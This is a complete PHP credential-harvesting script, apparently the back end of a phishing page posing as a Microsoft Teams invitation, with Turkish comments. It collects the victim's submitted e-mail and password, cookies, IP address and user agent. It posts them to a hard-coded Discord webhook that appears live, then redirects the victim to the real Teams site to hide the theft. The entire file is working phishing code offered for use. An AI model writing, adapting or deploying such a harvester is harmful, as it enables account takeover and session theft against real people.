<?php
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$cookies = isset($_POST['cookies']) ? $_POST['cookies'] : 'Çerez bulunamadı';
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'IP Bulunamadı';
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$http_cookies = isset($_SERVER['HTTP_COOKIE']) ? $_SERVER['HTTP_COOKIE'] : 'HTTP çerezleri bulunamadı';

// Discord Webhook
$webhook_url = "https://discord.com/api/webhooks/1401473482016952320/bo3vGGbGGcleKPWgvUduIpKXHl9QEqy8TerfzmJUyCeoYDHDQ0YaUVyPAoUexXgp4npb"; // Buraya Discord Webhook URL'sini ekle
$data = [
    "content" => "Yeni Davet - " . date('Y-m-d H:i:s') . ":\n**E-posta**: $username\n**Şifre**: $password\n**IP**: $ip\n**Tarayıcı**: $user_agent\n**Çerezler**: $cookies\n**HTTP Çerezleri**: $http_cookies"
];
$options = [
    'http' => [
        'header'  => "Content-Type: application/json",
        'method'  => 'POST',
        'content' => json_encode($data)
    ]
];
$context = stream_context_create($options);
file_get_contents($webhook_url, false, $context);

// Orijinal Teams sayfasına yönlendir
header("Location: https://teams.microsoft.com");
exit;
?>